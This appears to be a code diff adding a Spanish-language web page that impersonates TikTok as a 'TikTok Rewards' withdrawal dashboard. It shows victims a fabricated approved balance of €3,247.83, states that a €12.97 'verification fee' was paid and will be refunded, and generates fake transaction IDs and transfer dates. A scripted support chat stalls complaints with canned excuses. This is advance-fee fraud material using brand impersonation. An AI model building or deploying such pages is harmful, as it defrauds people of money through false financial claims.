+            <path d="M9.49 21.35l.1.28c-.02-.03-.05-.13-.1-.28zM4.92 19.37c.17-1.49.76-2.33 1.87-3.18 1.58-1.16 3.56-.5 3.56-.5v-3.9c.48-.01.96.02 1.44.09v5.01s-1.98-.66-3.56.5c-1.1.86-1.69 1.69-1.86 3.18-.01.82.14 1.88.81 2.79-.17-.09-.33-.19-.51-.3-1.48-1.04-1.75-2.59-1.75-3.69zM19.94 4.59c-1.09-1.24-1.5-2.5-1.65-3.38h1.37s-.27 2.31 1.66 4.59l.03.03c-.54-.35-1.03-.77-1.47-1.24z" fill="#EE1D52"/>
+            <path d="M26.54 8.12v4.91s-1.75-.07-3.04-.41c-1.81-.48-2.97-1.22-2.97-1.22s-.8-.53-.87-.56V21c0 .56-.15 1.97-.6 3.15-.59 1.54-1.5 2.55-1.67 2.75 0 0-1.11 1.37-3.06 2.29-1.76.83-3.31.81-3.77.83 0 0-2.67.11-5.08-1.52-.52-.36-1-.77-1.45-1.22l.01.01c2.4 1.63 5.08 1.52 5.08 1.52.46-.02 2.01-.01 3.77-.83 1.95-.92 3.06-2.28 3.06-2.28.17-.21 1.08-1.22 1.67-2.75.45-1.18.6-2.59.6-3.15V9.63c.06.04.87.56.87.56s1.16.74 2.97 1.22c1.29.34 3.04.41 3.04.41V7.98c.6.14 1.11.18 1.44.14z" fill="#EE1D52"/>
+            <path d="M25.1 7.98v3.85s-1.75-.07-3.04-.42c-1.81-.48-2.97-1.21-2.97-1.21s-.8-.53-.87-.57v10.14c0 .56-.15 1.97-.6 3.15-.59 1.54-1.5 2.55-1.67 2.75 0 0-1.11 1.37-3.06 2.29-1.76.83-3.31.81-3.77.83 0 0-2.67.11-5.07-1.52-.26-.27-.5-.54-.72-.82-.77-.98-1.24-2.13-1.36-2.46 0 0-.19-.57-.13-1.9.1-2.35.89-3.79 1.1-4.15a10.4 10.4 0 012.13-2.6 8.5 8.5 0 012.53-1.5c.58-.24 1.17-.41 1.79-.52.45-.08.9-.13 1.36-.14v3.89s-1.98-.66-3.56.5c-1.1.86-1.69 1.69-1.86 3.18-.01.82.14 1.88.81 2.79.17.11.34.22.51.31.26.35.57.65.93.9 1.44.95 2.65 1.02 4.2.4 1.03-.41 1.8-1.34 2.17-2.38.23-.65.23-1.3.23-1.97V1.21h3.6c.15.88.56 2.14 1.65 3.38.44.47.93.89 1.47 1.24.16.17.97 1.02 2.01 1.52.54.27 1.1.47 1.69.61z" fill="#fff"/>
+            <path d="M34.34 7.95h11.24l-1.04 3.1h-2.94v11.84h-3.62V11.04h-3.64V7.95zM64.14 7.95v3.1h3.64v11.84h3.62V11.04h2.94l1.04-3.1H64.14zM48.03 11.48a1.75 1.75 0 10-.01-3.5 1.75 1.75 0 00.01 3.5zM46.27 22.88h3.55V12.71h-3.55v10.17zM62.59 11.39h-4.15l-3.58 3.58V7.96h-3.53l-.01 14.92h3.56V18.9l1.11-1 3.46 4.89h3.81l-5.01-7.15 4.34-4.34zM96.64 15.73l4.34-4.34h-4.15l-3.58 3.58V7.96h-3.53l-.01 14.92h3.56V18.9l1.11-1 3.46 4.89h3.8l-5.01-7.15zM87.52 16.84c0 3.37-2.77 6.11-6.19 6.11s-6.19-2.73-6.19-6.11c0-3.37 2.77-6.11 6.19-6.11s6.19 2.74 6.19 6.11zm-3.15 0a3.04 3.04 0 10-6.08 0 3.04 3.04 0 006.08 0z" fill="#fff"/>
+            <path d="M78.3 16.88c0 .27.04.55.12.81l.02.05a2.3 2.3 0 001.1 1.54c.52.38 1.15.59 1.8.59v3.07c-1.49 0-2.57.05-4.19-.96-1.86-1.1-2.91-3.11-2.91-5.2 0-2.15 1.17-4.31 3.15-5.35 1.44-.75 2.53-.76 3.95-.76v3.07a3.06 3.06 0 00-3.04 3.04v.04z" fill="#69C9D0"/>
+            <path d="M84.39 16.88c0 .27-.04.55-.12.81l-.02.05a2.3 2.3 0 01-1.1 1.54c-.52.38-1.15.59-1.8.59v3.07c1.5 0 2.57.05 4.2-.96 1.86-1.1 2.91-3.11 2.91-5.2 0-2.15-1.17-4.31-3.15-5.35-1.44-.75-2.53-.76-3.96-.76v3.07a3.06 3.06 0 013.04 3.04v.04z" fill="#EE1D52"/>
+          </svg>
+        </div>
+        <div class="topbar-user">
+          <div class="topbar-avatar" id="userAvatar">U</div>
+          <span class="topbar-email" id="userEmail">user@email.com</span>
+          <button class="topbar-logout" onclick="handleLogout()" title="Cerrar sesión">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Content -->
+    <div class="dashboard-content">
+      <!-- Status Banner -->
+      <div class="status-banner animate-in delay-1">
+        <div class="status-dot"></div>
+        <div class="status-text">Cuenta verificada — <span>Tu saldo ha sido aprobado</span></div>
+      </div>
+
+      <!-- Balance Card -->
+      <div class="balance-card animate-in delay-2">
+        <div class="balance-label">Saldo disponible</div>
+        <div class="balance-amount">
+          <span class="currency">€</span><span id="balanceValue">3.247,83</span>
+        </div>
+        <div class="balance-sub">Saldo verificado y aprobado para retiro</div>
+        <div class="balance-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 13l4 4L19 7"/></svg>
+          Aprobado
+        </div>
+      </div>
+
+      <!-- Notice -->
+      <div class="notice-card animate-in delay-3">
+        <div class="notice-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        </div>
+        <div class="notice-text">
+          <strong>Retiro en procesamiento.</strong> Tu saldo será transferido automáticamente al método de pago registrado dentro del plazo indicado abajo.
+        </div>
+      </div>
+
+      <!-- Transfer Timeline -->
+      <div class="card animate-in delay-4">
+        <div class="card-header">
+          <div class="card-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            Estado del retiro
+          </div>
+          <span class="card-badge green">En proceso</span>
+        </div>
+        <div class="timeline">
+          <div class="timeline-item">
+            <div class="timeline-icon done">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 13l4 4L19 7"/></svg>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-title">Cuenta verificada</div>
+              <div class="timeline-desc">Tu identidad ha sido confirmada</div>
+            </div>
+            <div class="timeline-time">Completado</div>
+          </div>
+          <div class="timeline-item">
+            <div class="timeline-icon done">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 13l4 4L19 7"/></svg>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-title">Pago confirmado</div>
+              <div class="timeline-desc">Tasa de verificación procesada</div>
+            </div>
+            <div class="timeline-time">Completado</div>
+          </div>
+          <div class="timeline-item">
+            <div class="timeline-icon active">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-title">Procesando retiro</div>
+              <div class="timeline-desc">Tu saldo está siendo procesado</div>
+            </div>
+            <div class="timeline-time" style="color:var(--tk-red);font-weight:600;">En curso</div>
+          </div>
+          <div class="timeline-item">
+            <div class="timeline-icon pending">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-title">Transferencia enviada</div>
+              <div class="timeline-desc">Recibirás el dinero en tu cuenta</div>
+            </div>
+            <div class="timeline-time" id="transferDate">—</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Account Details -->
+      <div class="card animate-in delay-5">
+        <div class="card-header">
+          <div class="card-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            Detalles de la cuenta
+          </div>
+        </div>
+        <div class="info-grid">
+          <div class="info-row">
+            <span class="info-label">Email</span>
+            <span class="info-value" id="detailEmail">—</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Estado</span>
+            <span class="info-value green">✓ Verificado</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Saldo total</span>
+            <span class="info-value">€3.247,83</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Tasa pagada</span>
+            <span class="info-value">€12,97</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Fecha de retiro estimada</span>
+            <span class="info-value" id="detailTransferDate">—</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">ID de transacción</span>
+            <span class="info-value" id="transactionId">—</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Transfer Info -->
+      <div class="card animate-in delay-6">
+        <div class="card-header">
+          <div class="card-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+            Información de transferencia
+          </div>
+          <span class="card-badge yellow">Pendiente</span>
+        </div>
+        <div class="info-grid">
+          <div class="info-row">
+            <span class="info-label">Método</span>
+            <span class="info-value">Transferencia bancaria</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Plazo estimado</span>
+            <span class="info-value">5-7 días laborables</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Moneda</span>
+            <span class="info-value">EUR (€)</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Support -->
+      <button class="support-btn animate-in delay-7" onclick="openSupportChat()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        Contactar soporte
+      </button>
+
+      <!-- Footer -->
+      <div class="dashboard-footer animate-in delay-8">
+        <div class="footer-logo">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 102 30" fill="none">
+            <path d="M25.1 7.98v3.85s-1.75-.07-3.04-.42c-1.81-.48-2.97-1.21-2.97-1.21s-.8-.53-.87-.57v10.14c0 .56-.15 1.97-.6 3.15-.59 1.54-1.5 2.55-1.67 2.75 0 0-1.11 1.37-3.06 2.29-1.76.83-3.31.81-3.77.83 0 0-2.67.11-5.07-1.52-.26-.27-.5-.54-.72-.82-.77-.98-1.24-2.13-1.36-2.46 0 0-.19-.57-.13-1.9.1-2.35.89-3.79 1.1-4.15a10.4 10.4 0 012.13-2.6 8.5 8.5 0 012.53-1.5c.58-.24 1.17-.41 1.79-.52.45-.08.9-.13 1.36-.14v3.89s-1.98-.66-3.56.5c-1.1.86-1.69 1.69-1.86 3.18-.01.82.14 1.88.81 2.79.17.11.34.22.51.31.26.35.57.65.93.9 1.44.95 2.65 1.02 4.2.4 1.03-.41 1.8-1.34 2.17-2.38.23-.65.23-1.3.23-1.97V1.21h3.6c.15.88.56 2.14 1.65 3.38.44.47.93.89 1.47 1.24.16.17.97 1.02 2.01 1.52.54.27 1.1.47 1.69.61z" fill="#9ca3af"/>
+            <path d="M34.34 7.95h11.24l-1.04 3.1h-2.94v11.84h-3.62V11.04h-3.64V7.95zM64.14 7.95v3.1h3.64v11.84h3.62V11.04h2.94l1.04-3.1H64.14zM48.03 11.48a1.75 1.75 0 10-.01-3.5 1.75 1.75 0 00.01 3.5zM46.27 22.88h3.55V12.71h-3.55v10.17zM62.59 11.39h-4.15l-3.58 3.58V7.96h-3.53l-.01 14.92h3.56V18.9l1.11-1 3.46 4.89h3.81l-5.01-7.15 4.34-4.34zM96.64 15.73l4.34-4.34h-4.15l-3.58 3.58V7.96h-3.53l-.01 14.92h3.56V18.9l1.11-1 3.46 4.89h3.8l-5.01-7.15zM87.52 16.84c0 3.37-2.77 6.11-6.19 6.11s-6.19-2.73-6.19-6.11c0-3.37 2.77-6.11 6.19-6.11s6.19 2.74 6.19 6.11zm-3.15 0a3.04 3.04 0 10-6.08 0 3.04 3.04 0 006.08 0z" fill="#9ca3af"/>
+          </svg>
+        </div>
+        <p>© 2026 TikTok Rewards — Todos los derechos reservados.<br>Este panel es exclusivo para usuarios verificados.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════
+       SUPPORT CHAT POPUP
+  ═══════════════════════════════════════ -->
+  <div class="chat-overlay" id="supportChat" onclick="if(event.target===this)closeSupportChat()">
+    <div class="chat-window" role="dialog" aria-label="Soporte TikTok">
+      <div class="chat-header">
+        <div class="chat-header-avatar">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
+        </div>
+        <div class="chat-header-info">
+          <div class="chat-header-name">Soporte TikTok</div>
+          <div class="chat-header-status">En línea · responde al instante</div>
+        </div>
+        <button class="chat-close" onclick="closeSupportChat()" aria-label="Cerrar chat">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+      <div class="chat-messages" id="chatMessages"></div>
+      <div class="chat-quick-replies" id="chatQuickReplies"></div>
+      <div class="chat-input-bar">
+        <input type="text" placeholder="Escribe un mensaje…" disabled aria-label="Escribe un mensaje">
+        <button class="chat-input-send" disabled aria-label="Enviar">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ═══════════════════════════════════════
+    // APP LOGIC
+    // ═══════════════════════════════════════
+
+    function generateTransactionId() {
+      var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      var id = 'TK-';
+      for (var i = 0; i < 12; i++) {
+        if (i > 0 && i % 4 === 0) id += '-';
+        id += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return id;
+    }
+
+    function getTransferDate() {
+      var today = new Date();
+      var daysToAdd = 5 + Math.floor(Math.random() * 3); // 5-7 days
+      var transferDate = new Date(today);
+      transferDate.setDate(transferDate.getDate() + daysToAdd);
+      
+      // Skip weekends
+      while (transferDate.getDay() === 0 || transferDate.getDay() === 6) {
+        transferDate.setDate(transferDate.getDate() + 1);
+      }
+
+      var months = ['ene', 'feb', 'mar', 'abr', 'may', 'jun', 'jul', 'ago', 'sep', 'oct', 'nov', 'dic'];
+      return transferDate.getDate() + ' ' + months[transferDate.getMonth()] + '. ' + transferDate.getFullYear();
+    }
+
+    function handleLogin(e) {
+      e.preventDefault();
+      var email = document.getElementById('emailInput').value.trim();
+      var btn = document.getElementById('loginBtn');
+      var error = document.getElementById('loginError');
+
+      if (!email || !email.includes('@') || !email.includes('.')) {
+        error.style.display = 'block';
+        return false;
+      }
+
+      error.style.display = 'none';
+      btn.classList.add('loading');
+      btn.disabled = true;
+
+      // Store email
+      try { localStorage.setItem('tk_user_email', email); } catch(_) {}
+
+      // Simulate loading
+      setTimeout(function() {
+        showDashboard(email);
+      }, 1500);
+
+      return false;
+    }
+
+    function showDashboard(email) {
+      var loginPage = document.getElementById('loginPage');
+      var dashboardPage = document.getElementById('dashboardPage');
+
+      // Set user data
+      document.getElementById('userEmail').textContent = email;
+      document.getElementById('userAvatar').textContent = email.charAt(0).toUpperCase();
+      document.getElementById('detailEmail').textContent = email;
+
+      // Generate transaction data
+      var txId = generateTransactionId();
+      var transferDate = getTransferDate();
+      
+      // Try to get stored data or generate new
+      var storedTxId = null;
+      var storedDate = null;
+      try {
+        storedTxId = localStorage.getItem('tk_tx_id');
+        storedDate = localStorage.getItem('tk_transfer_date');
+      } catch(_) {}
+
+      if (!storedTxId) {
+        storedTxId = txId;
+        storedDate = transferDate;
+        try {
+          localStorage.setItem('tk_tx_id', storedTxId);
+          localStorage.setItem('tk_transfer_date', storedDate);
+        } catch(_) {}
+      }
+
+      document.getElementById('transactionId').textContent = storedTxId;
+      document.getElementById('transferDate').textContent = storedDate;
+      document.getElementById('detailTransferDate').textContent = storedDate;
+
+      // Animate transition
+      loginPage.style.opacity = '0';
+      loginPage.style.transition = 'opacity 0.3s ease';
+      
+      setTimeout(function() {
+        loginPage.classList.add('hidden');
+        dashboardPage.classList.add('active');
+        dashboardPage.style.animation = 'fadeIn 0.4s ease';
+
+        // Animate balance counting
+        animateBalance();
+      }, 300);
+    }
+
+    function animateBalance() {
+      var el = document.getElementById('balanceValue');
+      var target = 3247.83;
+      var duration = 1200;
+      var start = performance.now();
+
+      function update(now) {
+        var elapsed = now - start;
+        var progress = Math.min(elapsed / duration, 1);
+        // Ease out cubic
+        var eased = 1 - Math.pow(1 - progress, 3);
+        var current = target * eased;
+        
+        var formatted = current.toLocaleString('es-ES', { 
+          minimumFractionDigits: 2, 
+          maximumFractionDigits: 2 
+        });
+        el.textContent = formatted;
+
+        if (progress < 1) {
+          requestAnimationFrame(update);
+        }
+      }
+      requestAnimationFrame(update);
+    }
+
+    function handleLogout() {
+      var loginPage = document.getElementById('loginPage');
+      var dashboardPage = document.getElementById('dashboardPage');
+      var btn = document.getElementById('loginBtn');
+
+      dashboardPage.style.opacity = '0';
+      dashboardPage.style.transition = 'opacity 0.3s ease';
+
+      setTimeout(function() {
+        dashboardPage.classList.remove('active');
+        dashboardPage.style.opacity = '1';
+        loginPage.classList.remove('hidden');
+        loginPage.style.opacity = '1';
+        btn.classList.remove('loading');
+        btn.disabled = false;
+        document.getElementById('emailInput').value = '';
+      }, 300);
+    }
+
+    // ═══════════════════════════════════════
+    // SUPPORT CHAT
+    // ═══════════════════════════════════════
+    var FAQ = [
+      { q: '¿Cuándo recibiré mi dinero?', a: 'Tu retiro está en procesamiento y se transferirá a tu método de pago registrado dentro del plazo indicado en tu panel (normalmente 5‑7 días laborables).' },
+      { q: '¿Por qué tuve que pagar una tasa?', a: 'La tasa de verificación de identidad es obligatoria para liberar tu saldo y se reembolsa íntegramente junto con tu retiro.' },
+      { q: '¿Es seguro mi retiro?', a: 'Sí. Tu saldo ya fue verificado y aprobado, y todas las transacciones están encriptadas.' },
+      { q: 'No he recibido la transferencia', a: 'Si ya pasó la fecha estimada, según tu banco el ingreso puede tardar hasta 48 h adicionales en reflejarse.' },
+      { q: '¿Puedo cambiar mi método de pago?', a: 'El método se definió durante la verificación. Espera la confirmación de transferencia antes de solicitar cambios.' },
+      { q: 'Hablar con un agente', a: 'En este momento todos nuestros agentes están ocupados. Hemos registrado tu solicitud y te contactaremos por email en breve.' }
+    ];
+
+    var chatStarted = false;
+    var chatBusy = false;
+
+    function chatScrollBottom() {
+      var box = document.getElementById('chatMessages');
+      box.scrollTop = box.scrollHeight;
+    }
+
+    function addChatMessage(text, who) {
+      var box = document.getElementById('chatMessages');
+      var msg = document.createElement('div');
+      msg.className = 'chat-msg ' + who;
+      msg.textContent = text;
+      box.appendChild(msg);
+      chatScrollBottom();
+    }
+
+    function renderQuickReplies() {
+      var wrap = document.getElementById('chatQuickReplies');
+      wrap.innerHTML = '';
+      FAQ.forEach(function(item, i) {
+        var chip = document.createElement('button');
+        chip.className = 'chat-chip';
+        chip.type = 'button';
+        chip.textContent = item.q;
+        chip.onclick = function() { askQuestion(i); };
+        wrap.appendChild(chip);
+      });
+    }
+
+    function askQuestion(i) {
+      if (chatBusy) return;
+      chatBusy = true;
+      var item = FAQ[i];
+      addChatMessage(item.q, 'user');
+
+      // typing indicator
+      var box = document.getElementById('chatMessages');
+      var typing = document.createElement('div');
+      typing.className = 'chat-typing';
+      typing.innerHTML = '<span></span><span></span><span></span>';
+      box.appendChild(typing);
+      chatScrollBottom();
+
+      setTimeout(function() {
+        if (typing.parentNode) typing.parentNode.removeChild(typing);
+        addChatMessage(item.a, 'bot');
+        chatBusy = false;
+      }, 750);
+    }
+
+    function openSupportChat() {
+      var overlay = document.getElementById('supportChat');
+      overlay.classList.add('active');
+      if (!chatStarted) {
+        chatStarted = true;
+        renderQuickReplies();
+        setTimeout(function() {
+          addChatMessage('¡Hola! 👋 Soy el asistente de TikTok Rewards. ¿En qué puedo ayudarte? Elige una de las opciones de abajo.', 'bot');
+        }, 250);
+      }
+    }
+
+    function closeSupportChat() {
+      document.getElementById('supportChat').classList.remove('active');
+    }
+
+    // Cerrar con Esc
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') closeSupportChat();
+    });
+
+    // Auto-login if returning user
+    (function() {
+      try {
+        var saved = localStorage.getItem('tk_user_email');
+        if (saved) {
+          document.getElementById('emailInput').value = saved;
+        }
+      } catch(_) {}
+    })();
+  </script>
+
+</body>
+</html>
